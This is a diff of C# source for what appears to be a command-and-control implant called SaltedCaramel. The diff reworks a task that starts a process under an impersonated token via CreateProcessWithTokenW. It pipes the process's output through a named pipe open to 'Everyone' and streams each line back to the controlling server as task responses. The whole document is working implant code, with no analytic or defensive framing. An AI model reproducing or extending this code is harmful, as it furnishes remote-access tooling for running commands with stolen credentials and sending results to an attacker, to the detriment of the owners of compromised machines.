@@ -6,6 +6,7 @@ using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
+using System.Threading;
 
 namespace SaltedCaramel
 {
@@ -36,9 +37,9 @@ namespace SaltedCaramel
             PipeSecurity sec = new PipeSecurity();
             sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
 
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, sec);
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.None, 1024, 1024, sec);
 
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.None);
 
             try
             {
@@ -50,6 +51,7 @@ namespace SaltedCaramel
                     // Set process to use named pipe for input/output
                     startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                     startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
+                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES;
                 }
                 else
                 {
@@ -57,30 +59,41 @@ namespace SaltedCaramel
                     throw new Exception("Error connecting to named pipe server.");
                 }
 
-                bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, file, argString, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
+                string cmdLine;
+                if (argString != "")
+                    cmdLine = "\"" + file + "\" \"" + argString + "\"";
+                else
+                    cmdLine = "\"" + file + "\"";
+                bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, null, cmdLine, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
                 if (createProcess)
                 {
                     Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
 
-                    Process test = Process.GetProcessById(Win32.GetProcessId(newProc.hProcess));
-                    Debug.WriteLine("Got process handle!");
+                    Process proc = Process.GetProcessById(newProc.dwProcessId);
+                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Got process handle for " + newProc.dwProcessId);
 
                     // Trying to continuously read output while the process is running.
                     using (StreamReader reader = new StreamReader(pipeServer))
                     {
-                        char[] buffer = new char[1024];
-                        // Hangs on reading data for some reason.
-                        reader.Read(buffer, 0, 1024);
-                        string message = buffer.ToString();
-                        if (message != null)
+                        string message;
+                        while (!proc.HasExited)
                         {
-                            message += "\n";
+                            message = reader.ReadLine();
+                            if (message != "")
+                            {
+                                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
+                                implant.PostResponse(response);
+                            }
+                        }
+                        pipeClient.Close();
+                        message = reader.ReadToEnd();
+                        if (message != "")
+                        {
                             SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
-                            implant.SCPostResp(response);
+                            implant.PostResponse(response);
                         }
                     }
 
-                    pipeClient.Close();
                     pipeServer.Close();
                     implant.SendComplete(task.id);
                 }
@@ -133,7 +146,7 @@ namespace SaltedCaramel
                 procOutput = procOutput.TrimEnd();
                 proc.WaitForExit();
                 SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procOutput), task.id);
-                implant.SCPostResp(response);
+                implant.PostResponse(response);
                 implant.SendComplete(task.id);
             }
             catch (Exception e)
